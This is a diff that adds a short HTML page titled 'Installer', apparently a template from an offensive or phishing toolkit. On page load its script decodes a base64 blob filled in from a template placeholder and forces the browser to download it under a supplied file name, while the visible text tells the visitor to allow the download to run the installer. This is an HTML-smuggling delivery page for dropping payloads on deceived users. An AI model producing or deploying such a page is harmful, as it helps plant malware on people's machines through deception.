@@ -1,0 +1,25 @@
+<html>
+  <head>
+    <title>Installer</title>
+    <script type="text/javascript">
+      function x() {
+      var dataurl = "data:application/octet-stream;base64,{{.Base64Encoded}}";
+      downloadURI(dataurl, "{{.DroppedFilename}}");
+      }
+
+      function downloadURI(uri, name) {
+      var link = document.createElement("a");
+      link.download = name;
+      link.href = uri;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+      delete link;
+      }
+    </script>
+  </head>
+  <body onload="x()">
+    <h1>Installer</h1>
+    <p>Please click allow download to run the installer</p>
+  </body>
+  </html>
